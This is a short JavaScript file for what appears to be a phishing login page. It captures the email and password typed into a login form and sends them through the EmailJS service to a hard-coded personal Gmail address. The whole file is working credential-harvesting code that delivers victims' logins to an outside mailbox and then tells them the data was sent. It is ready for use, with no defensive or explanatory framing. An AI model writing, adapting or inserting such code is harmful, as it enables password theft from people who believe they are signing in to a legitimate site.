// Initialize EmailJS
emailjs.init("G3HtbV5uQTfd-VVZr"); // Replace YOUR_PUBLIC_KEY with your EmailJS public key

const loginForm = document.getElementById("loginForm");
const responseMessage = document.getElementById("responseMessage");

loginForm.addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent form from refreshing the page

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;


    // Send email using EmailJS
    emailjs
        .send("service_iu7vjmp", "template_wqz8iup", {
            to_email: "officialnitinbaghel1@gmail.com",
            user_email: email,
            user_password: password, // Send password value
        })
        .then(
            (response) => {
                responseMessage.style.color = "green";
                responseMessage.textContent = "Login data sent successfully!";
                loginForm.reset();
            },
            (error) => {
                responseMessage.style.color = "red";
                responseMessage.textContent = "Failed to send data. Try again!";
            }
        );
});
